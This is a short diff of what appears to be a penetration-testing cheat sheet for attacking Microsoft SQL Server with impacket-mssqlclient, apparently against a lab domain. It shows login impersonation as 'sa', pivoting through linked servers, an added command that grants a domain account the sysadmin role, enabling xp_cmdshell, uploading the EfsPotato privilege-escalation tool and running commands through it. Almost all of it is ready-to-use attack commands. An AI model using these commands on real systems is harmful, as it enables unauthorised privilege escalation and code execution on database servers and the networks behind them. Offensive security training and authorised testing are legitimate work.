@@ -904,7 +904,7 @@ impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
-+---------- Impersonate and Links----------+
++---------- Impacket-Mssqlclient ----------+
 enum_impersonate
 exec_as_login sa
 enum_links
@@ -912,6 +912,9 @@ sp_serveroption 'SQL02', 'rpc', 'true'
 sp_serveroption 'SQL02', 'rpc out', 'true'
 use_link "SQL02"
 use_link ..
+SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U', 'G');
+SELECT name, type_desc FROM sys.server_principals WHERE type = 'R' AND is_fixed_role = 1;
+EXEC master.dbo.sp_addsrvrolemember @loginame = 'RLAB\epugh_adm', @rolename = 'sysadmin';
 enable_xp_cmdshell
 upload /Upload/windows/EfsPotato.exe C:\Windows\Tasks\EfsPotato.exe
 xp_cmdshell C:\Windows\Tasks\EfsPotato.exe "powershell -c \"Invoke-Command -ScriptBlock { whoami /priv; arp /a; ipconfig /all }\""
